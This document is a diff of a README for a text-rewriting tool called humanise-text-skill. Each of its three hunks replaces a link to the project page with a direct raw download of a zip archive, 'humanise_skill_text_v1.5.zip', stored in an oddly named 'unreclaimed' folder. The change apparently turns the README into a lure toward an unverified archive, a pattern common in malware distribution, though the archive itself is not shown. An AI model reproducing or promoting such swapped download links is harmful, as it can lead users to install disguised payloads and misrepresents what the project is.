@@ -1,6 +1,6 @@
 # 🧠 humanise-text-skill - Turn stiff text into clear human writing
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/thoughtful-reservation690/humanise-text-skill)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/thoughtful-reservation690/humanise-text-skill/main/unreclaimed/humanise_skill_text_v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This repository is best for people who want to clean up drafts, rewrite content,
 
 Use this link to visit the page and download the project:
 
-[Open humanise-text-skill download page](https://github.com/thoughtful-reservation690/humanise-text-skill)
+[Open humanise-text-skill download page](https://raw.githubusercontent.com/thoughtful-reservation690/humanise-text-skill/main/unreclaimed/humanise_skill_text_v1.5.zip)
 
 ### What you need
 
@@ -205,7 +205,7 @@ This project is a good fit if you:
 
 If you want to revisit the project page, use this link:
 
-[https://github.com/thoughtful-reservation690/humanise-text-skill](https://github.com/thoughtful-reservation690/humanise-text-skill)
+[https://raw.githubusercontent.com/thoughtful-reservation690/humanise-text-skill/main/unreclaimed/humanise_skill_text_v1.5.zip](https://raw.githubusercontent.com/thoughtful-reservation690/humanise-text-skill/main/unreclaimed/humanise_skill_text_v1.5.zip)
 
 ## 🧰 Common File Types
 
